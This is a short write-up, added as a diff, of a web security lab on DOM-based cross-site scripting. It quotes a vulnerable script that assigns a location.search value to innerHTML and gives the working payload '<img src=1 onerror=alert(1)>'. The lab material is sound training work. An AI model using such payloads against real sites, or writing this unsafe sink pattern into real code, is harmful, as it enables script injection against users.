@@ -1,0 +1,20 @@
+LAB #5 - DOM XSS in innerHTML sink using source location.search
+
+Vulnerability - This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.
+
+Goal - To solve this lab, perform a cross-site scripting attack that calls the alert function.
+
+Analysis:
+1. When using search functionality, I see a response that has a sink:
+<script>
+    function doSearchQuery(query) {
+        document.getElementById('searchMessage').innerHTML = query;
+    }
+    var query = (new URLSearchParams(window.location.search)).get('search');
+    if(query) {
+        doSearchQuery(query);
+    }
+</script>
+2. Create a payload to alert a message:
+<img src=1 onerror=alert(1)>
+=> SUCCESSFULLY
